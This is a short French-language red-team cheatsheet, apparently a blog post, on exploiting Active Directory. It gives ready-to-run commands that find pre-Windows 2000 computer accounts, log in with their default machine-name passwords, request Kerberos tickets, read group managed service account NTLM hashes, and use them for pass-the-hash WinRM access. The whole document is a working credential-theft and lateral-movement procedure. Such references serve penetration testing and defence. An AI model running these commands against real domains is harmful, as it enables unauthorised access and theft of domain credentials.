---
title: "Pre-Windows 2000 & gMSA Password Exploitation"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "Cheatsheet: Pre-Windows 2000 & gMSA Password Exploitation"
summary: "ActiveDirectory | Pre-Windows 2000 & gMSA Password Exploitation"
tags:
  - "Active Directory"
  - "Kerberos"
  - "Red Team"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "ActiveDirectory"
ShowToc: true
TocOpen: false
---

## Détecter les comptes Pre-Win2000
```bash
# Via LDAP - chercher les comptes dans le groupe Pre-Win2000 avec PASSWD_NOTREQD
ldapsearch -x -H ldap://<DC> -D '<user>@<domain>' -w '<pass>' \
  -b 'DC=<domain>,DC=<tld>' \
  '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=32))' \
  sAMAccountName memberOf userAccountControl

# Via nxc (module pre2k si disponible)
nxc smb <DC> -u '<user>' -p '<pass>' -M pre2k
```

## Tester le password (= nom machine lowercase sans $)
```bash
nxc smb <DC> -u '<MACHINE>$' -p '<machine>'
# STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT = PASSWORD CORRECT
# (le compte ne peut pas faire de logon SMB mais l'auth est validée)
```

## Utiliser via Kerberos (contourne la restriction WORKSTATION_TRUST)
```bash
faketime -f '+Xh' impacket-getTGT '<domain>/<MACHINE>$:<password>' -dc-ip <DC>
export KRB5CCNAME=<MACHINE>\$.ccache
```

## Lire les gMSA passwords
```bash
# Si le compte machine est dans un groupe autorisé (ex: Domain Secure Servers)
faketime -f '+Xh' bloodyAD -d <domain> -u '<MACHINE>$' -p '<password>' \
  --host <DC_FQDN> -k get object '<gMSA>$' --attr msDS-ManagedPassword

# Résultat : msDS-ManagedPassword.NT: <NTLM_HASH>
```

## Identifier qui peut lire les gMSA passwords
```bash
# Décoder le SID dans msDS-GroupMSAMembership
ldapsearch -x -H ldap://<DC> -D '<user>@<domain>' -w '<pass>' \
  -b 'DC=<domain>,DC=<tld>' \
  '(objectClass=msDS-GroupManagedServiceAccount)' \
  sAMAccountName msDS-GroupMSAMembership

# Résoudre le SID
rpcclient -U '<user>%<pass>' <DC> -c 'lookupsids <SID>'
```

## WinRM avec gMSA (si Remote Management Users)
```bash
evil-winrm -i <DC_IP> -u '<gMSA>$' -H '<NTLM_HASH>'
```
